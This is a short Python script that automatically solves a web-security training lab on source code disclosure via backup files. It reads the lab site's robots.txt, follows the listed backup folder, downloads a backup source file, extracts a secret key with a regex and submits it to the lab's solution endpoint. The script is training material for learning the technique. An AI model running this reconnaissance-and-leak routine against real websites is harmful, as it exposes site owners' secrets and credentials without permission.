import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Source code disclosure via backup files')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

robots = requests.get("https://" + lab.id + ".web-security-academy.net/robots.txt")
print(f"Robots page found:\n{robots.text}")
robots_entry = robots.text.splitlines()[-1]
robots_entry = re.findall(r'/(.*)', robots_entry)[0]
print(f"Found backup folder: {robots_entry}")

backup_folder = requests.get("https://" + lab.id + f".web-security-academy.net/{robots_entry}")
backup_entry = re.findall(r'(\/.*?\.[\w:]+(?:\.[\w:]+)*)', backup_folder.text)[0]
backup_file = requests.get("https://" + lab.id + f".web-security-academy.net{backup_entry}")

secret = re.findall(r'\b\w{25,}\b', backup_file.text)[0]
print("Secret key: ", secret)
requests.post("https://" + lab.id + ".web-security-academy.net/submitSolution", data={"answer":secret})

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab")